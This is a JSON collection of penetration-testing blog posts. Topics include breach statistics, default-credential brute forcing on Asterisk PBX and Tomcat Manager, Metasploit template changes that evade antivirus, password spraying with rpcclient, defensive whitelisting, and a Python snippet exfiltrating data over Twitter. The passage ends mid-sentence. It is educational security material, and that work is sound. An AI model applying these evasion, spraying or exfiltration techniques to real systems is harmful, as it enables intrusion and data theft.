[
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Need For A Change - or - Burning Your Money\"\nTaxonomies: \"InfoSec 201, News, breach, external breach, internal breach, it security, verizon breach report\"\nCreation Date: \"Thu, 26 Mar 2015 17:43:47 +0000\"\n\nMick Douglas //\n\nTake look at this chart from last year's Verizon Data Breach Report.  It shows who notified the breached party when they were attacked.\n\nThis graph is a sad indictment for all of us in the information protection industry.  This chart means that only about 1 in 8 times there's a breach it's found out by an internal party.  Of course this means that 7 times of those 8 it's discovered by someone external to your organization.  That has got to hurt.  If you doubt me, just ask the PR firm or department of any breached organization.\nThere's two ways you can look at this chart.  First you can despair that all the spending on IT security has largely been... what? Wasted?  We'll not go that far.  Misallocated might be a better way of thinking about how your funds were spent.  Secondly, we can't help but see that there's so much room for improvement that virtually anything we change could make a big impact.\nIn light of such a lopsided graph, it's plain to see our internal detective controls need a quick boost.  While many are tempted to take the traditional approach to situations such as this; namely spending on new tools until the problem appears to go away.  We at BHIS would suggest a different course of action.  Start making things harder for the bad guys by taking a more active defensive posture.  We'll be listing some ways to make your defenses be more resilient, durable, cost effective, and above all -- active over the next few postings here, so stay tuned.\nBefore we finish this post, one thing to note:  the internal IT Audit Department lead the pack for finding the breaches.  That's great!  Good job auditors! (Seriously, when was the last time you thanked your auditor?)  Let's make this into a friendly competition and have the IT Operations and Security Teams lead the findings next year!\nWe're certainly looking forward to the Verizon Data Breach Report for this coming year.  Who knows what it'll contain?  Although given how rough \"The Year of the Breach\" was, the only sure bet is that it will have eye popping charts.\n\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Waiting Is the Hardest Part: A Purple Team's Take on MS15-034\"\nTaxonomies: \"InfoSec 301, Blue Team, Danger Will Robinson, MS15-034, Patch, Purple Team, Red Team, Remote Code Execution\"\nCreation Date: \"Thu, 16 Apr 2015 17:47:19 +0000\"\n\nMick Douglas //\n\nCurrent Status:\n- MS15-034 has remote Denial of Service (DoS)\n- Remote exploit code appears to be ready soon... maybe.  Stay tuned.\nBLUE TEAM MARCHING ORDERS:\n- Patch. Now. Please.\n- Pay *very* careful attention to your IIS logs for systems that are attacking or attempting the DoS.  You are being profiled.  Vulnerable servers will be the targets of attacks once working exploit code is released.\nRED TEAM MARCHING ORDERS:\n- Keep your eyes and ears open.\n- Help explain the risks to folks in your org who don't get the gravity of this.\nDetails:\nDespite a poor reputation for security, for the last few years, Microsoft has been doing an amazing job on the security front.  It's been about seven years since we had a remote code execution exploit publicly available for Windows.... and it looks like MS15-034 will likely be the end of that streak.\nThis is an attack against IIS and other web services that make use of HTTP.sys.  This vulnerability is exploited by attackers who send specially crafted HTTP requests.  At the time of this writing, most of the attack tools released for this vulnerability \u2018simply\u2019 create a denial of service by crashing the listening web service or the server\u2019s OS.  Since \u201cavailability\u201d is part of the CIA (Confidentiality, Integrity, and Availability) triad, this is a big deal\u2026 But it\u2019s likely about to get much worse.\nThere are newer variants of this attack that appear to be moving beyond the realm of simple DoS and are instead injecting executable code directly into memory. Hint: this isn\u2019t good.  What\u2019s worse is that this code will be run with System privileges.  There are no accounts that have a higher level of access on a Windows system.  Having random folks from the internet running code of their choice on your server is probably not a good thing.  We at BHIS encourage you to NOT take the approach Blanche duBois from \u201cA Streetcar Named Desire\u201d did: \u201cI\u2019ve always depended on the kindness of strangers.\u201d\nWhat makes this such a serious issue is that attacking web services is an attack against the raison d'etre for these systems.  This means your external firewall *must* allow access to the very service that's vulnerable.  D'oh!\nBecause this vulnerability is such a tempting target, everyone who\u2019s got an iota of exploit development skill is working feverishly on this.   Not only is there lasting fame and fortune for the winner of this race, there\u2019s a SUBSTANTIAL amount money at stake.  If there\u2019s one thing we\u2019ve learned from the movies, it\u2019s love conquers all.  Wait, not that.  Greed is good.  So show me the money!\n\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Asterisk SIP Server, From \"Info\" to \"Ouch\"\"\nTaxonomies: \"External/Internal, Password Spray, Red Team, Info2Ouch, Nessus, Vulnerabilities\"\nCreation Date: \"Mon, 01 Jun 2015 17:54:33 +0000\"\nCarrie Roberts //\n\nI learned some new stuff that will make me pay attention to \"Asterisk Detection\" Nessus informational findings in the future . . .\n\nOn an external network scan, Nessus reported two hosts running Asterisk SIP services as an informational finding.\n\n When entering the IP address in a browser, only a blank page was returned, however I ran dirbuster on it and found a login page at http:///mobile.\n\nLooking at the server response for this page showed that extensions and usernames are revealed in javascript.\n\nThe IPitomy user manual indicated that a login page exists at http:///ippbx on these systems.  This login page is shown in the image below.\n\n \n\nThe manual indicated that the default admin credentials are pbxadmin:ipitomy and that the non-admin user username is always their extension with a default password equal to the extension as well. For example, the extension 123 would have a username of 123 and a default password of 123.\n\nThe default admin credentials did not work in this case but some of the default user credentials did.  I used Burp Suite's Intruder functionality to guess the same username and password for extensions 100-999. To set this attempt up in Burp Intruder I used Battering ram attack type to place the same payload in all defined positions as shown below.\n\nOn the payloads tab, I set a payload type of \"Numbers\" and set the number range from 100 to 999 counting by ones.   \n\nSome of the accounts were using the default password. The successful login credentials could be spotted in the intruder results window by comparing the length of the response.  In this case, a length of 361 versus 231 was the indicator.\n\nComparing response length is often a good way to quickly determine success of an intruder attack but using the grep extract option is a life saver when response length isn't a good enough indicator.  You can define the portion of the response you want to extract from the Intruder options menu as shown below.\n\nI set the grep extract expression to show any text after \"ocation:\" and before \"Vary:\" in order to pick out the location header in the redirect response.\n\nThis makes the successful response really stand out as shown below.\n\nWith a successful login, a person can configure call settings like call forwarding, view call logs and listen to voicemail.\n\nLastly, I checked for account lockout by guessing 100 bad passwords in less than one minute immediately followed by a successful login with the correct password.  This means it is likely that other passwords could be discovered through brute-forcing since the user names are known and there is no account lockout mechanism.\n\nAll in all, this \"Informational\" finding for \"Asterisk Detection\" as reported by Nessus led to the discovery of three vulnerabilities in this case.\n\n1)  Information disclosure of employee first and last names and associated phone extensions on the login page.\n\n2)  Non-administrative access to user accounts through default credentials giving access to call settings and voicemail.\n\n3)  No account lockout to prevent password guessing for known extensions.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Service Detection - Tomcat Manager, From \"Info\" to \"Ouch\"\"\nTaxonomies: \"Red Team, Web App, Info2Ouch, Nessus, Vulnerabilities\"\nCreation Date: \"Wed, 15 Jul 2015 17:59:39 +0000\"\nCarrie Roberts //\n\nContinuing on the thread of highlighting Nessus vulnerability scan results that turned out to be more severe than reported . . .\n\nI always review the \"Info\" level \"Service Detection\" finding reported by Nessus, particularly any web servers that it lists because there are often blatant security issues hidden in there.\n\nThis is as simple as visiting each host:port combination in a web browser and seeing what the server response is.  To aid me in this effort when there are a lot of results to go through I use a free tool called EyeWitness by Chris Truncer that reads all the protocol, host and port combinations from the Nessus scan and takes a screenshot of each one as if you visited it manually in a web browser.  This allows me to quickly scan through the images and pick out services of interest or concern.  Other similar and recommended tools for doing the same thing are PeepingTom by Tim Tomes and Rawr by @al14s.\nDuring a recent penetration test I didn't have any of these tools available so I just used a web browser and entered the URL manually.   The scan result had indicated that a web server was running on port 8080 of several hosts. On one of the hosts, this brought up an Apache Tomcat page with a link to Tomcat Manager.\n\nA username and password was required to gain access to the Manager but to my surprise a default username of \"admin\" and a blank password worked.  I was surprised because this is something I think Nessus should have highlighted as a vulnerability.  Then again, I've seen Nessus miss default credential findings a lot so I shouldn't be surprised.\nAccess to the manager allowed deployment of WAR files from its interface as shown below.\n\nAn attacker or penetration tester can then deploy a web shell to the server to obtain command shell access to the server.  You can utilize a pre-built WAR file containing a web shell from the Laudanum project sponsored by Secure Ideas for this exploit.\n\nSo there you have it, a little golden nugget in an informational finding that is actually a critical vulnerability allowing command shell access to the server.\n \n\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Modifying Metasploit x64 template for AV evasion\"\nTaxonomies: \"Author, External/Internal, Joff Thyer, Red Team, AV, AV evasion, modifying measpoilt, shellcode\"\nCreation Date: \"Wed, 21 Oct 2015 20:21:42 +0000\"\nJoff Thyer //   \n\nWhen performing a penetration of test of organizations with Windows desktops, many testers will now resort to using tools like Veil\u2019s Powershell Empire in order to inject shellcode directly into memory.    Without doubt, this is a fantastic technique as it avoids writing to disk and running headlong into a direct hit by most endpoint protection solutions.   \n\nxkcd: The malware aquarium\n\nIt is often the the case that we want to perform some more thorough testing by using actual malware executables, and perhaps different command and control techniques during our test.   We want to vary our techniques in order to find out where the clipping threshold of defense technologies is set and be able to comprehensively report back on what techniques were effective on a system versus what techniques were not.   In most environments, the most commonly deployed endpoint protection technology is an Antivirus engine.\n\nAntivirus has become very effective at detecting off-the-shelf 32-bit malware executables from the Metasploit framework but tends to be lacking in the 64-bit arena.   Additionally, we find that network resident defenses are well-tuned to 32-bit second stage payloads from Metasploit but less capable of seeing a 64-bit second stage payload.    In my experience, the AV engines are not exclusively looking at the shellcode but also matching on the assembly code that constitutes the stub loader for Metasploit executables generated by the msfvenom command.\n\nWhen Metasploit payloads are generated they use a standard template executable in both the 32-bit and 64-bit cases.  The standard templates are in the form of precompiled executables in the framework\u2019s data directory.   In addition to the templates, the Metasploit project provides a source code directory in the framework.\n\nFocusing specifically on Windows, we can find both the 32-bit template source in C and the 64-bit template source in assembly, both of which are in the \u201c/usr/share/metasploit-framework/data/templates/src/pe/exe\u201d directory on a KALI distribution.\n\nIn both the 32 and 64-bit cases, the template source has a very similar function.   It allocates a buffer of 4096 bytes in memory and puts the string \u201cPAYLOAD:\u201d at the beginning of this buffer.   The string \u201cPAYLOAD:\u201d is placed into the buffer as a constant that indicates a starting place for \u201cmsfvenom\u201d to use when creating a new payload executable.\n\nThat starting place is an address in memory which msfvenom knows can be used to copy shellcode into.  The size of the available buffer for shellcode is the allocated buffer size in the template EXE minus eight (the length of the string \u201cPAYLOAD:\u201d).   Msfvenom will take the chosen payload, encode it with the appropriate encoder (if specified), and prepend no-operation (NOP) sled bytes if also chosen.\n\nThe final executable in the 32-bit case has been compiled from C source code.   In the C source code, the shellcode is called by casting the payload buffer to a pointer to a function (which has no function parameters).\n\nThe final executable in the 64-bit case has been compiled from assembly code.  The assembly code function allocates an executable buffer of memory, copies the shellcode into that memory, and executes it using a CALL instruction.  This is a very similar technique used by many different tools, including the awesome Powershell toys we all use.\n\n 32-bit source code for EXE template\n\n 64-bit assembly source code for EXE template\n\nArmed with this knowledge, I decided to see how one single AV engine (Avast) reacted when I simply took the 64-bit executable template and copied it to a Windows system.   Note that I did not even put any shellcode payload into the EXE but only took the template itself.\n\nIt was not really surprising that Avast immediately triggered an alert.   Let's face it, matching on the assembly opcodes for the template is a pretty easy way of triggering an alert without having to actually examine the shellcode payload.\n\n Avast tells me this is bad!\n\nStaying focused on the 64-bit case, there is absolutely no reason why I cannot recompile this assembly code and modify it as much or as little as I want to.   We only need to make sure that, at some point, it calls the two required bits of code to copy the payload into an executable memory segment we allocated and then executes it.\n\nCase 1:  For my first level of fun, I simply recompiled the same source assembly code.   Not surprisingly, Avast flagged this.\n\nCase 2: I changed the buffer length to 8192 bytes, and recompiled.  Nothing other than the buffer length was changed.   Avast completely failed this test by not flagging a single alert.  How do I know?  Well I compiled it on the system that Avast was also running.  Note that the instructions for compiling the assembly code are helpfully listed in the commands of the source code.\n\nLast section of x64 assembly listing\n\nCase 3: I modified all of the values in the assembly code to 8192, then took my newly generated executable template and created two different payloads with it.   One of the payloads used the 64-bit XOR encoding on the shellcode, while the other used no encoding at all.\n\nI then copied the payload files to my Windows 7 machine running Avast.   I forced Avast to scan them, and they passed with flying colors!   Then I executed them and shell was mine.\n\nWith case 3, I was particularly amused at Avast\u2019s DEEP SCAN, which seemed to indicate that it was looking really hard at what was going on!   But then, it told me that all was fine and the malware was happily executed.\n\nNew assembly source code listing with 8192 buffer length.\n\n64-bit payload using new template, and no encoding.\n\n64-bit payload using new template and XOR encoding\n\nNew payloads in a directory on the Windows system!\n\nGo ahead and scan my directory...\n\nI am safe, what a relief!\n\nOh no, I might get caught here!  Phew...\n\nAnd now it\u2019s shell time.\n\nConclusion: My theory and practical experience was that AV vendors are looking at the templates rather than the shellcode itself.   In this specific instance, we saw immediate success with only a minor assembly code modification and absolutely no encoding of a 64-bit shellcode payload.\n\nWhy choose Avast?  No specific reason other than I needed a solution in a hurry to execute my test.   I will be repeating the experiment with other AV engines to see what my mileage looks like.   There are many possible variations on this technique but like so much in life, it is better to start simple and ramp up as needed.   Happy hunting!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Password Spraying & Other Fun with RPCCLIENT\"\nTaxonomies: \"Author, Joff Thyer, Password Spray, Red Team, Joff Thyer, password spraying, RPCCLINET\"\nCreation Date: \"Fri, 30 Oct 2015 20:25:57 +0000\"\nJoff Thyer //   \n\nMany of us in the penetration testing community ar\u200be used to scenarios whereby we land a targeted phishing campaign within a Windows enterprise environment and have that wonderful access into the world of Windows command line networking tools. You get your shell and before you know it, you are ready to run all your favorite enumeration commands. These are things like: \n\nC:\\> NET VIEW /DOMAIN\n\nC:\\> NET GROUP \"Domain Administrators\" /DOMAIN\n\n...and so on. Not to mention that you often have all of the wealth of Metasploit post exploitation modules and the many wonders of various PowerShell tools, such as Veil and PowerShell Empire.\n\nImagine a world where all you have is a Linux host available on an internal network with no backdoor shell access to any existing Windows system. Imagine that world wherein you are effectively segmented away from the rest of the network and cannot even capture useful network traffic using interception techniques such as Ettercap. This was indeed the case for me recently whereby all I could do was SSH into a single Linux host I controlled.\n\nAfter having not been in this situation in some time, I paused a moment before recalling the wonderful world of Samba. In particular, there are two excellent and useful programs in the Samba suite, namely \"rpcclient\" and its friend \"smbclient.\" Also, let us not forget our favorite DNS utility called \"dig.\"\n\nMy first task was to use available reconnaissance to make informed guesses as to what the internal domain name was likely to be. There are a few different methods to think about here, but the first thing was to play with dig to determine DNS information of use. I can try to look up the Windows global catalog record and authoritative domain server records to determine domain controller addresses.   Examples as follows:\n\n\u200bThis will only give me answers if I have predicted or determined the correct \"domain.corp\" name.\n\nNow, luckily for me, I had access to internal Nessus vulnerability report data and had determined that SMB NULL sessions were permitted to some hosts. I matched up the data to my dig results and determined that the NULL sessions were actually corresponding to domain controller addresses. My next task was to try and enumerate user and group information from the domain controllers with rpcclient only available to me. I quickly determined by using the \"man\" page that rpcclient could indeed perform an anonymous bind as follows:\u200b\n\n\u200b...whereby 10.10.10.10 was the chosen address of the domain controller I could anonymously bind to. After that command was run, rpcclient will give you the most excellent \"rpcclient> \" prompt. At this point in time, if you can use anonymous sessions, then there are some very useful commands within the tool. \n\n1. Enumerate Domain Users\n\n2. Enumerate Domain Groups\n\n3. Query Group Information and Group Membership\n\n4. Query Specific User Information (including computers) by RID.\u200b\n\nSo in working with these basic commands, I was able to survey the landscape of Windows domain user and group information pretty thoroughly.\n\nAnother technique often used during a penetration test is called \"password spraying.\" This is a particularly effective technique, whereby given a list of domain users and knowledge of very common password use, the tester attempts to perform a login for every user in the list. The technique is very effective, given that you deliberately limit the list of passwords to try to a small number. In fact, a single password per spraying attempt is advisable for the sole reason that you really do not want to lock accounts.\n\nBefore password spraying, it is very useful to determine the Windows domain password policy using a command such as \"NET ACCOUNTS /DOMAIN\" in the Windows world. However, given that we don't have a Windows shell available to us, rpcclient gives us the following options.\n\n\u200bAt least we are able to determine the crucial information about the password length. After I write this, I will probably work out how to decode the password properties and match them back to the appropriate information but I have not yet done that task.\n\nIn order to perform a password spray attack, the next step is to pick a common password (such as \"Autumn2015\") and work out our technique on how to spray using rpcclient. Conveniently, rpcclient allows us to specify some commands on the command line which is very handy. The follow two examples show a successful logon versus a failed logon. (Password of \"bbb\" is the correct logon).\n\nIn these examples, we specifically told rpcclient to run two commands, these being \"getusername\" and then \"quit\" to exit out of the client. Now we have all of the ingredients to perform a password spraying attack. All we need is a bourne/bash shell loop and we are off to the races. Example of a simple shell script or command line to spray, given that the \"enumdomusers\" output is in the \"domain-users.txt\" file, would be as follows.\n\nYou know that you are successful when you see the string \"Authority\" appear in the output. Lack of success for each user is going to be the \"NT_STATUS_LOGON_FAILURE\" message.\n\nIf you begin to get the \"ACCOUNT_LOCKED\" failure, you should immediately stop your spray because you have likely sprayed too many times in a short period of time.\n\nAssuming you have gained access to a credential, one of the additional nice things you can do is explore the SYSVOL using the smbclient program. The syntax is as follows.\n\n\u200bI highly recommend getting familiar with the UNIX Samba suite and in particular these tools. They quite literally saved my bacon over the past week, and you could well be in the same boat needing these fun tools in your future also.\u200b\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How Compliance Compromises Happen. (Or, The Most Boring Article Title in the History of All the  Internet)\"\nTaxonomies: \"Author, InfoSec 201, John Strand\"\nCreation Date: \"Mon, 02 Nov 2015 21:29:49 +0000\"\nJohn Strand // \n\nThere have been quite a few articles lately on how compliance standard X or Y is broken.  Unfortunately, this often leads to blaming the nameless and faceless people behind the standards.  It is easy to simply say they are dullards and not fit to be setting any agenda relating to computer security.   \n\n  Dullards do what Dullards do. \n\nWhile this may be true, there is a bit more to it than that.  Further, if we look at how these standards get watered down, there is a lot we can learn.  Basically, let\u2019s talk about common mistakes when it comes to creating and adhering to compliance frameworks. As a side note, most of this is based on helping a relatively small group try to define security standards within their limited geographical location for a specific industry.  The only reason I am writing this is that many of the problems they ran into are the same issues I see again and again in our customers. http://www.darkreading.com/analytics/hipaa-not-helping-healthcares-software-security-lagging/d/d-id/1322715\n\nBurdens on Industry\n\nThe first major breakdown when creating or adhering to compliance is the intense fear that the standards are going to be too burdensome on the industry in question.  A long time ago, I was working on compliance standards for various oil companies in relation to the government.  It was my first experience with this issue.  There was much hemming and hawing about overburdening the oil and gas industry with unnecessary oversight that would make the whole process unprofitable.  This was years before the whole scandal in MMS blew up in 2010. See the article by Ian Urbina for more details.  But, the really odd thing to me at the time was the fact that the very people who were complaining about overburdening an industry were the same people who drove \u201cprestige class\u201d rental vehicles to the meetings and wore clothes that were worth more than I made in a month at the time. What exactly is the point of all this?  The point is the people who create compliance requirements are often under tremendous political pressure by people far more powerful than they are.\n\nFurther, even if rampant corruption and graft are not at play, as human beings we have a huge desire to make as many people as possible happy.  This often standardizes mediocrity.  We have seen this again and again in this industry, from the seven-layer module to PCI to HIPAA.  Also, when this occurs it often obscures the true meaning of what the compliance standards were trying to do in the first place.  For example, many compliance standards are meant to be a series of guidelines and are provided to offer direction for organizations who don\u2019t even know where to start.  These things quickly become the core baseline and minimum level of effort organizations strive to meet.  Anything above and beyond these recommendations is often looked at as a waste of money.\n\nFear of the Unknown\n\nThere is a certain herd mentality that infects all we do in security.  This is because many people have little-to-no understanding of what they are doing from a base-technical level.  For example, when testing and working with customers, it is very common for us to encounter auditors who downplay technical risks because it does not fit into some simple compliance model they work with.  A number of years ago we were testing an energy company and discovered a large number of edge-routers with telnet running with no authentication for user access and a default password would grant enable or level 15 access to the devices.  Needless to say, this vulnerability would allow us to completely take over their networks.  However, when we provided this customer with this vulnerability, they immediately discounted it because when running a vulnerability scanner, it simply found the telnet server and blessed this vulnerability with a low CVSS score.  The customer was hesitant to fix the issue because some other \u201cauthority\u201d deemed the risk lower than what we provided.  There was much handwringing over going against the automated risk score.  So, we demonstrated how the vulnerability could be exploited and once they saw the true risk, they immediately addressed the issue. But, they had to see the risk first.  To put their hand in its side, if you will.\n\nThis also brings up another point.  Many of the best testers I have ever known were auditors who got sick and tired of being asked to \u201cprove it.\"   That is what penetration testing provides. Proof.  Not scan results.  Not automated risk scores. It is about removing the shroud of the unknown and bringing clarity.\n\n Pentest challenge accepted. \n\nIt is All Unknown\n\nAt the end of the day, many of the standards which exist today don\u2019t make sense.  But why?  How does this happen?  In fact, pretty easily.  For example, there are a wide number of compliance standards in organizations that require passwords of eight characters or more.  Why? For us to answer that question, we need to go back in time.  We are in 2015 after all, and we have self-lacing shoes and flying cars.  To take this one password length example and truly understand it, we have to go back to 1985.  Yes, the Back to the Future references are thick in this one. Anyway, the NIST Greenbook was released, you can get it here: http://csrc.nist.gov/publications/secpubs/rainbow/std002.txt It references several things.  First, it mentions how long we should use passwords for (roughly 6+ months) before changing them.  And it also covers the length of the passwords for those timeframes.  A nice, in the middle number, was eight characters.  This was all based on how long it would take to crack a password over a 300 baud services, which is 8.5 guesses per min. Yeah\u2026  300 baud\u2026 See, this is how a lot of compliance errors occur. People do not understand something and they instead rely on the previous work of others who came before.  Insanity carries forward.  Because no one knows better. \n\nThings We Don\u2019t Understand Seem Hard\n\nIn sports, there are often these mystical barriers we believe are insurmountable. Things like breaking the sub four-minute mile, which was done by Bannister in 1954. It seemed impossible, but once it is done, many follow. Or, a more applicable example, internal firewalls or Internet whitelisting. These two security approaches seem impossible as well.  However, if we look at implementing them in even permissive ways, we are far more secure than a simple AV/Blacklisting approach. We have worked with many companies who have no desire to move to a whitelisting/firewall everything approach.  However, once they were compromised, their attitude changed rather quickly. Once they start down the path of greater restriction, it did not seem so hard.\n\nEventually, it Gets Better\n\nAs much as this seems like one long painful breakdown of the compliance breakdown, it does get better. We are starting to see organizations that are far more interested in doing things right than being compliant.  Believe me, I have seen it.  No. Really.  Stop laughing. I have seen organizations who have started to empower their security teams to do the right thing.  They have proper budgets.  They have security teams who are focusing on their data and not a checklist.   They are companies who have management support at the highest levels.\n\nThey are ever so much closer to being \u201csecure\u201d because they know that secure is a process, not a destination.\n\nBut It Does Get Worse First\n\nThat was nice, wasn\u2019t it?  Looks like we might end this post on a happy note.\n\n No, we will not. \n\n See, in almost every organization who gets better and moves away from trying to be compliant and instead moves to being secure, they were compromised.  They learned their lessons.  They touched the frying pan and found it was hot.  They will do anything in their power to not make the same mistakes again.  I have seen some companies who have imported these lessons in the form of hiring a C-O from a company who was burnt.  But, somewhere in their past, there was a deep dark psychological altering experience that made them learn that simply being compliant will not work.  We have to strive for better.\n\nNo one dies and is at peace with the fact they made their networks compliant.\n\nNo one.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The New Security Fundamentals - Kill Your AV\"\nTaxonomies: \"Author, How-To, InfoSec 201, John Strand, AV, firewalls, Kill your AV, say no to networks, turn off networks\"\nCreation Date: \"Tue, 03 Nov 2015 21:35:57 +0000\"\nJohn Strand //\n\nAV is Dead \n\nLong Live Whitelisting. We have been discovering more and more of our tests bypass AV controls with ease.  We have yet to see any iteration or vendor in the blacklist space who is adequately preventing attacks using simple blacklist solutions.  What needs to be done in this industry is a move towards a whitelisting approach.  This can either be in the form of a product like Bit9, Lumension or Bromium.  Or, it can be in the form of using existing controls such as Applocker and/or Software Restriction Policies (SRP).  We recommend organizations start with Applocker then work their way up to full Application Whitelisting.   \n\nBasically, you can start by defining exactly what directories are allowed to run various programs.  For example, we can lock down programs to run from the Windows and Program Files directories.  There are ways to bypass this (i.e. ISR-Evilgrade style attacks, exploit the app and launch from that directory), however, the overall improvement to the security of an environment is extensive.   \n\nTo put it bluntly, if I had to choose Applocker or traditional AV, I would choose Applocker every time.  Further, this is not something that is product-specific. It is something you probably already have in your environment.  This is key as it does not require purchasing another very expensive tool to achieve.   \n\nFirewall Everything   \n\nAnother key trait we see in many successful organizations is the heavy use of internal firewalls.  While we have gotten pretty good at setting up firewalls on the parameter of our environments, we are still horrible at enabling the things on the inside of our parameters.    Now, let me be crystal clear on this.  The built-in firewall on Windows is horrible.  Its login is hideous and it can be a pain to enable across your environment via group policy.   \n\nTurn it on anyway.   \n\nThere is also the option of using the firewalls built into various AV products.  The nice thing about these firewalls is that they are already deployed and can be managed from a centralized location.  From a policy perspective, these should be set up on the workstations that can only be accessed from tightly controlled Admin VPNs and server subnets, but the workstations cannot talk to each other. At all.  There is no good reason to have workstations talking to each other over SMB.  Users should not be sharing files in this way.   \n\nEver.   \n\nBasically, you want to treat your internal network as hostile, because it is.   \n\nWhat does this do?  For starters, it will stop an attacker from pivoting using pass-the-hash attacks or token impersonation to other workstations.  I cannot stress this enough: When we are testing, we pivot from machine to machine till we find one with a local privilege escalation vulnerability or has sensitive data we can access.  But turning on your local firewall, you can effectively stop this from happening.   \n\nAttackers can still access file servers and critical services.  But, those communication paths are known and can be monitored far easier than trying to monitor every communication between every system.   \n\nInternet Whitelisting\n\nThis is, by far, the most contentious item in this write-up.  Any time I talk about Internet whitelisting in a class or at a conference, I get a lot of screaming, crying, hiding under tables and breakout sessions of alcoholism.\n\n Standard Preparation for an Active Defense Talk  \n\nYeah, my presentations can get out of hand quickly. But before all the pitchforks and Molotov cocktails get thrown in my general direction, I want everyone to take a deep cleansing breath.  See, when I discuss Internet whitelisting, people have this odd vision of Internet star chambers convening to debate, in painful detail, the pros and cons of every website their users request to access.  Blood will be spilled\u2026  Joints pulled from sockets.   \n\nThat is not what I am talking about.  Rather, let\u2019s play a simple mental game.  Let\u2019s say hypothetically, that you whitelist the top 1,000 sites on the internet. Of course, you would exclude porn, gambling, and One Direction sites.  But, you would allow all others.  Then, if a user wanted to access a site, not on the list, you would do a quick review, then allow it.  No blood, no inquisition. Heck, you could even allow users to automatically add sites.   \n\nWould your total exposure to the Internet be more or less than it is now?   \n\nThe answer is it would be dramatically reduced.  Not even a small fraction of what it was before.  Yes, the sites you allow could possibly be used to attack your users.  But, if your users were compromised, the resulting C2 would most likely not go through.   Remember, the goal is not reducing risk to 0, but rather trying to get it to an acceptable level.  Also, this will further reduce the white noise that often needs to be cut through in almost any incident or Hunt Teaming engagement.   \n\nDiscrepancy Analysis   \n\nAt any security team\u2019s core, the goal should be simply to identify deviations from the norm.  However, as an inverse to this, it also requires us to have a firm understanding of what exactly \u201cnormal\u201d is.  This is both harder and easier than many people believe.  For example, trying to take an inventory of every system can be a total nightmare. However, there are tools out there that can be of assistance.  First, the Security Onion has Bro installed and it has a very cool ability to do a full inventory of all the user-agent strings that pass through it.  This can be used to quickly identify user-agent strings which are abnormal.  Why does this matter?  First, it can be very helpful to identify old systems that are still lurking in your environment.  If all your systems are Windows 7-10 and you see a Windows XP user-agent string, then it could be a UA string for a piece of malware, or it could be a very out-of-date system that needs to be eradicated like a termite or roach.   \n\nSome other tools that are outstanding for discrepancy analysis are Kansa and Microsoft Advanced Threat analytics.  Both of these can be used to baseline large numbers of systems and run comparisons of the configurations, applications and network connections (Kansa), or the user behavior on the network (Microsoft Advanced Threat Analytics).   \n\nConclusions   \n\nYears ago I made a joke.  I said environments would be far more secure if they would simply remove anti-virus.  I made a few people mad.  My point is this: if we did disable AV we would be more secure.  Looking back, I should have been far firmer with my analysis.   \n\nYOU WOULD BE MORE SECURE!!\n\nWhy?  Because then you would do all of these other things to secure your network.\n\nAV/IDS/IPS are all security theater.  They provide an illusion of security that was never there.  We need to get beyond them.  We need to understand that attackers will bypass them (because they will) and then start building our networks accordingly.   \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Can we C2? Yes we can!\"\nTaxonomies: \"C2, Red Team\"\nCreation Date: \"Fri, 18 Dec 2015 21:44:15 +0000\"\n Dakota Nelson // \n\nIt's become more and more common lately to see advanced attackers using legitimate internet channels to move data in and out of networks. Social networks such as Twitter and Tumblr, utilities such as Dropbox and Soundcloud, and even business tools such as Salesforce and Google Docs can all be used as channels for command and control. Threat intelligence reports, such as this one from FireEye, can provide insight into the tactics, techniques, and procedures of these opponents, but they don't provide the hands-on experience that network defenders need to prepare against these types of real-world threats.\n\nThat's where new offensive tools come in.\n\nLike everyone here at BHIS, I love security. In my case, this translates to a lot of late nights hammering out software - such as sneaky-creeper, an open-source project designed to enable easy communication over legitimate internet channels for the purpose of threat emulation.\n\nIt's designed to be readable and easy to use:\n\nfrom sneakers import Exfil\n# channels actually move data\nchannel = \"twitter\"\n# encoders let you encrypt/encode/mess with the data before you send it\nencoders = [\"b64\"]\n# note that they can be chained!\n# contains the API keys and details for the account you'll post to \ntwitter_params = {\"key\": \"xxxx\",\n\"secret\": \"xxxx\",\n\"token\": \"xxxx\",\n\"tsecret\": \"xxxx\",\n\"name\": \"twitter_account_name\"}\ndata = \"whatever you'd like\"\nfeed = Exfil(channel, encoders)\nfeed.set_channel_params({\"sending\": twitter_params, \"receiving\": twitter_params})\nfeed.send(data)\nprint(feed.receive())\n\nSneaky-creeper is built and maintained by a team of students and is still a work in progress - while it's a little rough around the edges, it's constantly being refined and improved to provide a robust communications channel to emulate advanced attacker communications capabilities. If you're interested in unusual C&C methods, check it out on Github!\n\n_______\n\nSee more from Dakota at his blog Ungineers.com\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Developing Hacking Kung Fu (or How To Get Into Information Security)\"\nTaxonomies: \"Author, Derek Banks, General InfoSec Tips & Tricks, InfoSec 101\"\nCreation Date: \"Mon, 21 Dec 2015 21:45:09 +0000\"\nDerek Banks //\n \n\nMore than occasionally I am asked how to get into Information Security as a profession.   As attacks and breaches continue to escalate in frequency the demand rises for information security talent.  I also frequently hear from those in a hiring role that it is hard to find people with the right skill set.  So how does one land that job in a field that by some counts will have shortage of 1.5 million workers by the end of the decade?  The answer is to develop good hacking kung fu.   When most hear the words \u201ckung fu\u201d they think of Chinese martial arts.  This not entirely inaccurate from a Western perspective, but the meaning in Chinese is closer to \u201cthe result of time and effort\u201d. One must invest the time to learn the technical skills involved in attacking and defending computer systems and networks to develop their hacking kung fu in order to get that Infosec job that previously seemed out of reach.   Just like learning the martial arts, getting started can be painful and the right mindset is key to becoming successful.  It is also necessary to find a mentor and practice, practice, and practice some more. It may be easier for some, for example a systems administrator already in IT, but anyone can learn the necessary skills with the appropriate investment of time.First and most importantly, you must have a desire and a passion to understand how things work.  You have to become someone that wants to understand how a particular computer system functions and once you figure it out, determine if the workings of that system can be used in ways that the original designers did not intend.   In my opinion this is the essence of being a \u201chacker\u201d and you need to always be in this mindset.   Martial arts students learn base moves that are then built upon to create true martial skill.  Similarly, in Infosec you need to learn base technical skills that are then 